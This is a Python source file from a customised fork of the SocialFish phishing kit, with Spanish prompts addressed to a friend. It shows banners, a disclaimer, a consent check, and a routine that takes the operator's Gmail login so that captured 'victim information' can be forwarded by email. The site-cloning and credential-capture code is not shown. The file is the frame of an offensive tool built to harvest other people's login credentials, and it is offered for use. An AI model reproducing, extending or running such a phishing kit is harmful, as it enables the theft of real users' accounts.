######################################################
#                                                    #
#       SOCIALFISH v2.0sharkNet                      #
#                                                    #
# by:     L_0 "Akram"                                #
#                                                    #
# Herramienta especializada para Lina <3             #
#                                                    #
#                                                    #
#                                                    #
######################################################

from os import system
from huepy import *
from sys import exit

def clear():
    system('clear')

def conNot():
    print(red('''
  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ 
      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
          \|           
                    [!] Network error. Verify your connection.\n
'''))
    exit(0)

def phpNot():
    print(red("\n\n[!] PHP installation not found. Please install PHP and run me again. http://www.php.net/ "))
    exit(0)

def pyNot():
    print(red("[!] Please use Python 3. $ python3 SocialFish.py "))

def ngrokNot():
    print(red("[!] Ngrok not found. Downloading it..."))

def head():
    clear()
    print(bold(cyan('''
                          '
                        '   '  UNDEADSEC | t.me/UndeadSec 
                      '       '  youtube.com/c/UndeadSec - BRAZIL
                 .  '  .        '                        '
             '             '      '                   '   '
  ███████ ████████ ███████ ██ ███████ ██       ███████ ██ ███████ ██   ██ 
  ██      ██    ██ ██      ██ ██   ██ ██       ██      ██ ██      ██   ██ 
  ███████ ██    ██ ██      ██ ███████ ██       █████   ██ ███████ ███████ 
       ██ ██    ██ ██      ██ ██   ██ ██       ██      ██      ██ ██   ██ 
  ███████ ████████ ███████ ██ ██   ██ ███████  ██      ██ ███████ ██   ██ 
      .    '   '....'               ..'.      ' .
         '  .                     .     '          '     '  v2.0sharkNet 
               '  .  .  .  .  . '.    .'              '  .
                   '         '    '. '      Herramienta especializada para Lina <3
                     '       '      '             Hecho por: L_0 "Akram"
                       ' .  '
                           ''')))

def end():
    clear()
    print(cyan('''
                   S O C I A L 
              |\    \ \ \ \ \ \ \      __           ___
              |  \    \ \ \ \ \ \ \   | O~-_    _-~~   ~~-_
              |   >----|-|-|-|-|-|-|--|  __/   /   DON'T   )
              |  /    / / / / / / /   |__\   <     FORGET   )
              |/     / / / / / / /             \_   ME !  _)
                          F I S H                ~--___--~

> Watch us on YouTube: https://youtube.com/c/UndeadSec 

> Follow me on Twitter: https://twitter.com/A1S0N_ 

> Contribute on Github: https://github.com/UndeadSec/SocialFish 

> Join our Telegram Group(Portuguese Brazil): https://t.me/UndeadSec \n'''))


def loadModule(module):
    print(cyan('''
   _.-=-._     .-,     THIS IS NOT A JOKE!
 .'       "-.,' /  MISUSE OF THIS TOOL RESULTS 
(          _.  <          IN CRIME!
 `=.____.="  `._\\  AND THE RESPONSIBILITY IS
                         ONLY YOURS.
                       
 [*] %s module loaded. Building site...'''  % module))

def checkEd():

    if input(red(' [!] Ana aqui tienes que escribir una y, ya me entiendes porque XD [y/N] > ')).upper() != 'Y':
        clear()
        print(red('\n[ Porque escribes una n? ]\n'))
        exit(0)

def checkmail():

    from core.email import smtp_provider, connect_smtp
    from getpass import getpass
    from smtplib import SMTP

    if input(cyan('\n [!] Quieres tener la informacion de la victima desde tu gmail? [y/N] > ')).upper() == 'Y':
        
        login = input(cyan(' [+] Pon  tu gmail entonces. > '))

        try:
            provider = login.split('@')[1].split('.')[0]
        except (IndexError, ValueError):
            print(red(' [!] This domain is not supported!'))
            return	
	
        if provider.lower() == 'gmail':
            print(yellow(' [!] Before access please enable less secure apps\n --> [https://myaccount.google.com/lesssecureapps]'))

        passwd = getpass(cyan(' [+] Contraseña > '))
      
        domain, port = smtp_provider(provider)

        connect_smtp(domain, port, login, passwd)
        
